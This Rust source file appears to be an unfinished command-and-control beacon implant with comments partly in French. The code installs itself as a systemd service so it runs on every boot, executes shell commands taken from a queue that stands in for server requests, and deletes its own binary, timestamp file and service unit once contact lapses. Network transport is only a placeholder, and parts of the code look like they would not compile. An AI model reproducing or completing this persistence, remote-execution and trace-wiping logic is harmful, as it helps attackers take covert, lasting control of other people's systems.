use std::{env, fs};
use std::cell::RefCell;
use std::fs::File;
use std::process::Command;
use std::io::Write;
use std::os::unix::net::UnixStream;
use std::path::Path;
use chrono::{DateTime, Local};

use beacon_controller::models::actions::BeaconAction;
use beacon_controller::models::actions::BeaconAction::{ExecuteCommand, FallAsleep};

thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
    fs::read_to_string(TIME).unwrap_or_else(|_err| {
        println!("{}", Local::now());
        Local::now().to_string()
    }).parse::<DateTime<Local>>().expect("failed to parse")
));

static TIME: &str = "./emit";
static SERVICE: &str = "/etc/systemd/system/beacon_need.service";

fn main() {
    run();
}

//should not be needed anymore
// fn read_entry() -> &'static str {
//     //placeholder fonction
//     let entry :&str = "switch toto";
//     if !entry.is_empty() {
//         update_time();
//     }
//     entry
// }
//
// fn transmit_payload_to_next_beacon(entry_string:&str){
//     //placeholder fonction
//     println!("{}", entry_string)
// }
//
// //Read entry messages and transmit them if they are not the mode switch signal
// fn read_and_transmit_as_tower(is_operating_as_transmition_tower:bool) -> bool {
//     let entry_string: &str = &read_entry(); //get the entry string
//     let wake_up_string: &str = "switch";
//     if entry_string.split(' ').next().unwrap() == wake_up_string {
//         !is_operating_as_transmition_tower
//     } else {
//         transmit_payload_to_next_beacon(entry_string);
//         is_operating_as_transmition_tower
//     }
// }

fn run() {
    //test varbiables
    //let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
    let mut cmd = Command::new("sh");
    cmd.arg("-c")
        .arg("echo hello world");
    let mut simu_request = vec!(ExecuteCommand(cmd));

    //make executable run on boot
    exec_on_boot();

    //check if file TIME exists and if not create it
    if !Path::new(TIME).try_exists().expect("cannot check existence") {
        let mut ftime = File::create(TIME).unwrap();
        writeln!(ftime, "{}", Local::now().to_rfc3339()).expect("failed to write in file");
    }

    //boucle principale du programme
    loop {
        //should not be needed anymore
        // //swap between tower and active
        // if is_operating_as_transmition_tower {
        //     //act as the transmition tower, aka read for change and forward message
        //     is_operating_as_transmition_tower = read_and_transmit_as_tower(is_operating_as_transmition_tower);
        //     println!("je suis une tour");
        // } else {
        //     println!("je suis actif");
        // }

        match get_latest_action(&simu_request) {
            Some(req) => {
                update_time();
                match req {
                    ExecuteCommand(cmd) => exec_command(cmd),
                    _ => println!("Nop")
                }
            },
            _ => println!("No communication")
        }

        //Check duration since last communication with server
        if LAST_ENTRY.with(|instant| {
            Local::now().signed_duration_since(*instant.borrow()).num_seconds() >= 2
        }) {
            //delete all traces
            let exe = env::current_exe().expect("Failed to get current exe");
            fs::remove_file(&exe).expect("Failed to delete current exe");
            fs::remove_file(TIME).expect("Failed to delete TIME");
            fs::remove_file(SERVICE).expect("Failed to delete SERVICE");
            break
        }
    }
}

fn exec_command(mut cmd: Command) -> String {
    let output = cmd.output().expect("command failed to execute");
    String::from_utf8(output.stdout).unwrap()
}

fn exec_on_boot() {
    let exe = env::current_exe().expect("Failed to get current exe");
    let mut file = File::create(SERVICE).unwrap();
    writeln!(file,
             "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
             exe.to_str().unwrap()).expect("Unable to Write");
    Command::new("sh")
        .arg("-c")
        .arg("systemctl enable beacon_need.service")
        .spawn()
        .expect("systemctl failed to execute");
}

fn update_time() {
    LAST_ENTRY.with(|time| {
        *time.borrow_mut() = Local::now();
        let mut ftime = File::create(TIME).unwrap();
        writeln!(ftime, "{}", &*time.borrow().to_rfc3339())
    }).expect("Failed to write");
}

//placeholder
fn get_latest_action(mut simu_request: &Vec<BeaconAction>) -> Option<BeaconAction> {
    return simu_request.pop()
}